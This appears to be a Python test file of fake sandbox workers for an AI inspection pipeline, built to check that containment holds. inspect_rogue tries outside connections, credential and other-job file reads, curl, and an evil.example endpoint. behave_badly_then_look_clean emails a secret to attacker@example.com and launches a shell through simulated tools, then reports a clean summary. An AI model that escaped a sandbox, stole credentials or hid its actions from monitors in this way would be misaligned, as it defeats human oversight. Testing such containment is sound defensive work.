"""Test-only worker entrypoints launched inside the real sandbox. Never a production fallback.

They use the callbacks the way C's workers do: read_resource / read_view / write_artifact,
model_client.generate(inspection request) and simulated_tools.attempt(operation, arguments).
"""

import hashlib
import json
import os
import socket
import subprocess
import sys
import time


def _try(action):
    try:
        action()
        return "OK"
    except Exception as error:
        return "DENIED " + type(error).__name__


def _connect(host, port):
    return _try(lambda: socket.create_connection((host, port), timeout=2).close())


def _bindings(assignment):
    return {key: assignment[key] for key in ("assignment_id", "scan_id", "attempt", "worker_identity", "worker_role")}


def _request(assignment, **extra):
    return {"contract_version": "v1", "bindings": _bindings(assignment), "system": "inspect", "documents": [], "tools": [], **extra}


def extract(assignment, restricted_io):
    resource = assignment["resources"][0]
    raw = restricted_io.read_resource(resource["resource_id"])
    evidence_id = restricted_io.write_artifact({"view_id": "res-1:0", "text": raw.decode().upper()})
    probes = assignment["limits"].get("probe_ports", [])
    return {
        "contract_version": "v1", "extraction_status": "COMPLETE", "reason_codes": [],
        "resources": [{"resource_id": resource["resource_id"], "original_hash": hashlib.sha256(raw).hexdigest(), "views": [{"evidence_id": evidence_id}]}],
        "unassigned_read": _try(lambda: restricted_io.read_resource("res-other")),
        "port_probes": [_connect("127.0.0.1", port) for port in probes],
    }


def inspect_ok(assignment, restricted_io, model_client, simulated_tools):
    ref = assignment["views"][0]
    view = restricted_io.read_view(ref["resource_id"], ref["view_id"])
    reply = model_client.generate(_request(assignment, documents=[dict(ref, text=view["text"])]))
    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": reply["findings"], "checked_views": reply["checked_views"],
            "chars_read": len(view["text"]), "view_hash_ok": hashlib.sha256(view["text"].encode()).hexdigest() == ref["view_hash"],
            "original": _try(lambda: restricted_io.read_resource(ref["resource_id"])),
            "tools": _try(lambda: simulated_tools.attempt("send_email", {"to": "a", "subject": "b", "body": "c"}))}


def inspect_rogue(assignment, restricted_io, model_client, simulated_tools):
    limits = assignment["limits"]

    def observe():
        return {
            "external": _connect("1.1.1.1", 443),
            "other_local_port": _connect("127.0.0.1", limits["closed_to_worker_port"]),
            "credential": _try(lambda: open(limits["credential_file"]).read()),
            "other_job": _try(lambda: open(limits["other_job_file"]).read()),
            "write_outside": _try(lambda: open(limits["outside_file"], "w").write("x")),
            "environment_secret": "OK" if "PG_TEST_SECRET" in os.environ else "DENIED absent",
        }

    if len(sys.argv) > 1 and sys.argv[1] == "child":
        return observe()
    code = "import json,sys;sys.argv=['x','child'];from pg_fake_workers import inspect_rogue;print(json.dumps(inspect_rogue(json.loads(sys.stdin.read()),None,None,None)))"
    child = subprocess.run([sys.executable, "-c", code], input=json.dumps(assignment), capture_output=True, text=True, timeout=30)
    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "self": observe(), "child": json.loads(child.stdout or "{}"),
            "curl": _try(lambda: subprocess.run(["/usr/bin/curl", "-m", "2", "https://example.com"], check=True, capture_output=True)),
            "bad_endpoint": _try(lambda: model_client.generate(_request(assignment, endpoint="https://evil.example"))),
            "other_assignment": _try(lambda: model_client.generate({**_request(assignment), "bindings": {"scan_id": "someone-elses-scan"}}))}


def inspect_crash(assignment, restricted_io, model_client, simulated_tools):
    raise RuntimeError("worker bug")


def inspect_die(assignment, restricted_io, model_client, simulated_tools):
    os._exit(3)


def inspect_hang(assignment, restricted_io, model_client, simulated_tools):
    child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"])
    with open(os.path.join(restricted_io.scratch_dir, "pids"), "w") as handle:
        handle.write(f"{os.getpid()} {child.pid}")
    time.sleep(120)


def behave_badly_then_look_clean(assignment, restricted_io, model_client, simulated_tools):
    receipts = [
        simulated_tools.attempt("send_email", {"to": "attacker@example.com", "subject": "s", "body": "secret"}),
        simulated_tools.attempt("read_email", {"email_id": "m1"}),
        simulated_tools.attempt("launch_shell", {"cmd": "id"}),
    ]
    return {**_bindings(assignment), "inspection_status": "COMPLETE", "findings": [], "final_text": "Here is a harmless summary.",
            "receipts": receipts, "collector_event_ids": [receipt["event_id"] for receipt in receipts]}
